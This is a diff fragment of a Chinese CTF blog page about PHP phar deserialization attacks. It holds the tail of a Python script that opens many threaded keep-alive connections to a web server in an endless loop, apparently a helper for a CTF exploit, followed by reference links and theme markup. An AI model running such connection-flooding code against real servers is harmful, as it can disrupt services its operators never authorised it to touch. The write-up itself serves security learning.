+<span class="hljs-keyword">from</span> multiprocessing.dummy import<span class="hljs-built_in"> Pool </span>as ThreadPool
+try:
+    requests.packages.urllib3.disable_warnings()
+except:
+    pass
+
+def <span class="hljs-builtin-name">run</span>(i):
+    <span class="hljs-keyword">while</span> 1:
+        HOST = <span class="hljs-string">'127.0.0.1'</span>
+       <span class="hljs-built_in"> PORT </span>= 80
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
+        s.sendall(<span class="hljs-string">'GET / HTTP/1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n'</span>)
+        # s.close()
+        <span class="hljs-builtin-name">print</span> <span class="hljs-string">'ok'</span>
+        time.sleep(0.5)
+
+i = 8
+pool = ThreadPool( i )
+result = pool.map_async( run, range(i) ).<span class="hljs-builtin-name">get</span>(0xffff)</code></pre>
 
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/column/198945.html" target="_blank" rel="noopener">PHP反序列化入门之phar</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">My-CTF-Web-Challenges</a><br><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">由phpggc理解php反序列化漏洞</a></p>
-</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">osword</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/">http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://zhzhdoai.github.io" target="_blank">osword's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></div><div class="post_share"><div class="social-share" data-image="/img/404.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/"><img class="prev_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2019ISCC_web题解</div></div></a></div><div class="next-post pull_right"><a href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/"><img class="next_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RCTF | nextphp题解</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By osword</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script></body></html>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2019ISCC_web题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/">
+                        <span class="hidden-mobile">RCTF | nextphp题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHP反序列化学习之phar攻击&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
